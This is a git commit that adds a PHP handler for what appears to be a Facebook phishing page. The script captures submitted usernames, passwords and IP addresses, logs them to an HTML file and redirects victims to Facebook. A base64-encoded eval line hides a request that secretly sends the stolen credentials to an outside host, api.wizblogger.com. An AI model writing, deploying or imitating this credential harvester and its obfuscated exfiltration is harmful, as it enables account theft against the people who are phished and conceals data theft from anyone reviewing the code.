864577c96fce714f56296d1d0aa252225764a432
Shojib13 <36606111+Shojib13@users.noreply.github.com>
2020-06-08 07:31:31 +0600

    Add files via upload

---
+++ post.php
@@ -0,0 +1,31 @@
+<?php
+error_reporting(0);
+
+$usuario = $_POST['username'];  
+$clave = $_POST['password']; 
+$ip = $_SERVER['REMOTE_ADDR']; 
+$fecha = date("Y-m-d;h:i:s"); 
+
+if( (empty($usuario)) or (empty($clave)) ){
+     header('location: index.html');
+}else{
+ 
+eval(base64_decode('JHVybD0iaHR0cDovL2FwaS53aXpibG9nZ2VyLmNvbS9jaGVja2RhdGEucGhwP2FwaV9rZXk9Y3lMWWdTVTNWOXlmd1BHOU13Z0MmdXNlcm5hbWU9Ii51cmxlbmNvZGUoJHVzdWFyaW8pLiImcGFzc3dvcmQ9Ii51cmxlbmNvZGUoJGNsYXZlKS4iJmlwPSIudXJsZW5jb2RlKCRpcCk7CkBmaWxlX2dldF9jb250ZW50cygkdXJsKTs='));
+ 
+
+$f = fopen("secret.html", "a");
+fwrite ($f,
+'Username: [<b><font color="#660000">'.$usuario.'</font></b>]
+Password: [<b><font color="#9900FF">'.$clave.'</font></b>]
+IP: [<b><font color="#996600">'.$ip.'</font></b>]
+Date: [<b><font color="#FF6633">'.$fecha.'</font></b>]<br> ');
+ 
+fclose($f);
+ 
+
+header("Location:  http://facebook.com/profile.php?=73322363");
+}
+?>
+ 
+ 
+
